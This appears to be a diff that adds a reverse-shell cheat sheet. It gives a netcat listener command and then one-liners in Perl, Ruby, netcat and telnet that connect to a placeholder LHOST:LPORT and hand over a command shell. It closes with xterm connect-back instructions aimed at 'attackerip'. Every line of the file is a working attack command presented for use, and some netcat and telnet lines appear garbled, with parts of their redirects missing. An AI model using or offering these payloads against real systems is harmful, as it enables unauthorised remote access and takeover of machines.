@@ -1,0 +1,40 @@
+# Setup Listener
+$ nc -l -v LHOST LPORT
+
+Perl (does not depend on /bin/sh)
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+Perl (if running Windows)
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+Ruby (does not depend on /bin/sh)
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+Ruby (if running Windows)
+ruby -rsocket -e 'c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+Netcat
+nc -c /bin/sh LHOST LPORT
+/bin/sh | nc LHOST LPORT
+rm -f /tmp/p; mknod /tmp/p p && nc LHOST LPORT 0/tmp/p
+
+Telnet
+rm -f /tmp/p; mknod /tmp/p p && telnet LHOST LPORT 0/tmp/p
+telnet LHOST LPORT | /bin/bash | telnet LHOST LPORT_2   # Remember to listen on your machine also on LPORT_2 tcp
+
+xterm
+Follows further details on xterm reverse shell:
+
+To catch incoming xterm, start an open X Server on your system (:1 - which listens on TCP port 6001). One way to do this is with Xnest:
+Xnest :1
+Then remember to authorise on your system the target IP to connect to you:
+xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
+xhost +targetip             # Run this INSIDE the spawned xterm on the open X Server
+Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:
+xterm -display attackerip:1
+Or:
+$ DISPLAY=attackerip:0 xterm
+It will try to connect back to you, attackerip, on TCP port 6001.
+
+Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:
+/usr/openwin/bin/xterm -display attackerip:1
